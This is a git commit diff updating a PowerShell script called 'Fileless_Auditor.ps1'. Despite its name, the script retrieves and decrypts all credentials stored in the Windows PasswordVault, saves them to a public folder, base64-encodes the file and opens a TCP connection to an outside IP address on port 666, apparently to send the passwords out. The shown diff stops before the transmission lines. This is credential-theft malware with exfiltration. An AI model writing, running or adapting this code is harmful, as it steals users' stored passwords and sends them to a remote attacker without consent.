0510061fd76cec1a3fed3223cd235a704eb09a7d
Savitar407 <42724977+Savitar407@users.noreply.github.com>
2021-02-22 20:28:15 -0500

    Update Fileless_Auditor.ps1

--- Fileless_Auditor.ps1
+++ Fileless_Auditor.ps1
@@ -1,5 +1,6 @@
-[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] 
-(new-object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ } > C:\Users\Public\passwords.txt
+[void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$allpass = $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ } >> C:\Users\Public\passwords.txt
 $test=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("C:\Users\Public\passwords.txt"));
 $socket = New-Object net.sockets.tcpclient('209.151.149.234',666);
 $stream = $socket.GetStream();
